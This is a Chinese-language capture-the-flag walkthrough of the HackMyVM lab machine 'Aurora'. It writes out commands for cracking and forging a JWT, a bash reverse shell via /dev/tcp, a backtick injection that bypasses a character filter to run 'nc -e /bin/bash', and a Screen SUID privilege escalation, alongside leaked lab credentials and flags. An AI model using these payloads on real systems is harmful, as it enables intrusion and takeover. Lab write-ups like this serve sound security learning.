# Aurora

2025.03.12 https://hackmyvm.eu/machines/machine.php?vm=Aurora

[video](https://www.bilibili.com/video/BV1DBDfYUELJ/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```

发现 3000 使用的是 Express ，get 方式扫描目录没结果，使用 post 方式再次扫描 web 目录。

```
gobuster dir -t 100 -k -e -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.5.39:3000/ -m POST

http://192.168.5.39:3000/register             (Status: 400) [Size: 29]
http://192.168.5.39:3000/login                (Status: 401) [Size: 22]
http://192.168.5.39:3000/Login                (Status: 401) [Size: 22]
http://192.168.5.39:3000/Register             (Status: 400) [Size: 29]
http://192.168.5.39:3000/execute              (Status: 401) [Size: 12]
http://192.168.5.39:3000/LogIn                (Status: 401) [Size: 22]
http://192.168.5.39:3000/LOGIN                (Status: 401) [Size: 22]
http://192.168.5.39:3000/logIn                (Status: 401) [Size: 22]
```

使用 postman 进行测试，POST 方式访问 http://192.168.5.39:3000/register 提示 The "role" field is not valid，然后提交的 json 参数中进行探测，role:admin、role:user 发现 user 成功，这时又提示 Column 'username' cannot be null ，再添加个 username 参数，然后又提示 Column 'password' cannot be null ，再添加个 password 字段：

```
{
    "role": "user",
    "username": "jack",
    "password": "jack"
}
```

这时提示 Registration OK，然后用这个注册的用户凭据在调用http://192.168.5.39:3000/login 接口:

```
{
    "role": "admin",
    "username": "jack",
    "password": "jack"
}

返回
{
    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImphY2siLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MTc4MDQ4N30.P30q1STpQlI0krsAF6V7K_NQKX2P3OojkgMuDQK3DAU"
}
```

发现是 jwt，解析后显示：

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "jack",
  "role": "user",
  "iat": 1741779158
}
```

可以使用这个在线网站进行操作 https://jwt.p2hp.com/ ，将 role 修改成 admin，username 修改成 admin，看看能否有未授权访问，但是不行。在访问/login 还是显示未授权，修改后认证不成功。

爆破一下 jwt 中的密钥，将 jwt 字符串保存在文本中使用 john 进行爆破：

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash --pot=./pot
```

得到密码 nopassword ，然后对 jwt 进行修改成 usernaem:admin 和 role:admin

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxOTA5NTE5OTM0fQ.X0y11_tfdvGcsUL0cTOpksXhmeOBw0iFKpmWtDUdA-c
```

修改请求头中的信息：

```
curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxOTA5NTE5OTM0fQ.X0y11_tfdvGcsUL0cTOpksXhmeOBw0iFKpmWtDUdA-c' -H 'Content-Type: application/json' http://192.168.5.39:3000/execute
```

执行后报错说缺少 file 参数，使用 ffuf 探测一下参数:

```
ffuf -t 100 -c -X POST -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxOTA5NTE5OTM0fQ.X0y11_tfdvGcsUL0cTOpksXhmeOBw0iFKpmWtDUdA-c' -H 'Content-Type: application/json' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.39:3000/execute -d '{"FUZZ":"id"}' -ac
```

找到参数名为 command 进而执行反弹:

```
curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxOTA5NTE5OTM0fQ.X0y11_tfdvGcsUL0cTOpksXhmeOBw0iFKpmWtDUdA-c' -H 'Content-Type: application/json' -d '{"command":"/bin/bash -c \"/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1\""}' http://192.168.5.39:3000/execute
```

得到 shell 后，发现 app.js 文件，查看内容发现连接数据库的配置信息：

```
const pool = mysql.createPool({
  host: 'localhost',
  user: 'admin',
  password: 'zMgRthZraw6Sf',
  database: 'auroraDB',
});

MariaDB [auroraDB]> select * from users;
+----+----------+--------------+-------+
| id | username | password     | role  |
+----+----------+--------------+-------+
|  1 | admin    | CMcvw9Q5v79Z | admin |
| 29 | jack     | jack         | user  |
+----+----------+--------------+-------+
```

sudo -l 显示 `(doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *` 在脚本中字符串拼接可以执行命令 os.system('ping -c 2 ' + ip_address) , 但是在代码中对分隔符进行了过滤：

```
forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
```

但是没有过滤 `` 所以可以直接先执行反引号中的命令,正好目标机器上有 nc：

```
`nc 192.168.5.3 8888 -e /bin/bash`
```

拿到了 user flag：

```
doro@aurora:~$ cat user.txt
ccd839df5504a7ace407b5aeca436e81
```

发现 suid 程序 screen GNU_Screen_4.5.0 这个版本有漏洞 https://www.exploit-db.com/exploits/41154 按照这里面的操作执行，最终拿到了 root 权限：

```
# cat root.txt
052cf26a6e7e33790391c0d869e2e40c
```
